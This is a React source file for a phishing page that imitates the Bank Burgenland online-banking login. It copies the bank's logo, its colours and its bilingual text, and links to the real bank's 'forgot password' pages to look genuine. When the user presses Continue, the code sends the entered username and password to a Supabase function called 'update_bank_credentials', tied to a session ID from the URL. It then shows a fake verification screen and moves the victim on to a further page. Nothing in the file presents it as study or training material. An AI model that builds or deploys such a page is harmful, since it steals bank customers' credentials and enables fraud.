import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Eye, EyeOff } from "lucide-react";
import burgenlandLogo from "@/assets/burgenland-logo.png";
import burgenlandBg from "@/assets/burgenland-bg.png";
import burgenlandIcon from "@/assets/burgenland.jpg";

const PRIMARY = "#005aa5";
const FOCUS_BG = "#d6e6f2";

const Burgenland = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Bank Burgenland - Login", burgenlandIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-1">
          <img src={burgenlandLogo} alt="Bank Burgenland" className="h-14 md:h-16" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${burgenlandBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[620px] rounded overflow-hidden">
          {/* Header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-2xl"
            style={{ backgroundColor: PRIMARY }}
          >
            Login
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            <p className="text-[13px] md:text-base leading-tight" style={{ color: "#333" }}>
              {lang === "de"
                ? "Hier können Sie sich für Ihr neues Online Banking anmelden. Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner anderen Seite eingeben und diese geheim halten. Wir werden Sie nie nach Ihrer PIN oder einer TAN fragen!"
                : "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."}
            </p>

            <hr className="border-gray-200" />

            {/* Username */}
            <div className="space-y-1">
              <div className="flex items-center justify-between">
                <span className="font-normal text-sm" style={{ color: "#999" }}>
                  {lang === "de" ? "Benutzername" : "User name or authorised party number"}
                </span>
                <span className="text-sm">
                  <a
                    href="#"
                    onClick={(e) => {
                      e.preventDefault();
                      setLang(lang === "de" ? "en" : "de");
                    }}
                    className="no-underline hover:underline"
                    style={{ color: PRIMARY }}
                  >
                    {lang === "de" ? "English" : "Deutsch"}
                  </a>
                </span>
              </div>
              <div className="relative">
                <input
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  onFocus={() => setIsFocused(true)}
                  onBlur={() => setIsFocused(false)}
                  className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                  style={{
                    backgroundColor: isFocused ? FOCUS_BG : "#f1f1f1",
                    borderColor: isFocused ? PRIMARY : "#dedede",
                    boxShadow: isFocused ? `0 0 0 1px ${PRIMARY}` : "none",
                  }}
                />
                {username && (
                  <button
                    onClick={() => setUsername("")}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    <X size={24} color={isFocused ? PRIMARY : "#333"} />
                  </button>
                )}
              </div>
            </div>

            {/* Password */}
            <div className="space-y-1">
              <span className="font-normal text-sm" style={{ color: "#999" }}>
                {lang === "de" ? "Passwort" : "Password"}
              </span>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  onFocus={() => setIsPasswordFocused(true)}
                  onBlur={() => setIsPasswordFocused(false)}
                  className="w-full px-3 py-2.5 border rounded text-sm outline-none transition-colors"
                  style={{
                    backgroundColor: isPasswordFocused ? FOCUS_BG : "#f1f1f1",
                    borderColor: isPasswordFocused ? PRIMARY : "#dedede",
                    boxShadow: isPasswordFocused ? `0 0 0 1px ${PRIMARY}` : "none",
                  }}
                />
                {password && (
                  <button
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-2 top-1/2 -translate-y-1/2"
                    type="button"
                  >
                    {showPassword ? <EyeOff size={20} color={isPasswordFocused ? PRIMARY : "#333"} /> : <Eye size={20} color={isPasswordFocused ? PRIMARY : "#333"} />}
                  </button>
                )}
              </div>
            </div>

            <div className="text-center">
              <span className="text-[15px]" style={{ color: PRIMARY }}>
                {lang === "de" ? "Sie melden sich zum ersten Mal an?" : "You are logging in for the first time?"}
              </span>
            </div>

            {lang === "de" && (
              <p
                className="text-center"
                style={{ color: "#333", fontSize: "13px", lineHeight: "1.3", marginLeft: "-18px", marginRight: "-18px" }}
              >
                Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den AGB und Nutzungsbedingungen sowie der Datenschutzerklärung der Bank ausdrücklich zu.
              </p>
            )}

            <hr className="-mx-6 border-gray-200" />

            <button
              className="w-full py-2 text-white font-semibold rounded-md text-base"
              style={{ backgroundColor: PRIMARY }}
              onClick={async () => {
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}
            >
              {lang === "de" ? "Weiter" : "Continue"}
            </button>

            <hr className="-mx-6 border-gray-200" />

            <div className="flex flex-col items-center" style={{ gap: 0 }}>
              <a
                href="https://banking.bank-bgld.at/banking/login.xhtml?m=120#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: PRIMARY }}
              >
                {lang === "de" ? "Benutzername vergessen" : "Forgot username"}
              </a>
              <a
                href="https://banking.bank-bgld.at/banking/login.xhtml?m=120#"
                target="_blank"
                rel="noopener noreferrer"
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: PRIMARY }}
              >
                {lang === "de" ? "Passwort vergessen" : "Forgot password"}
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default Burgenland;
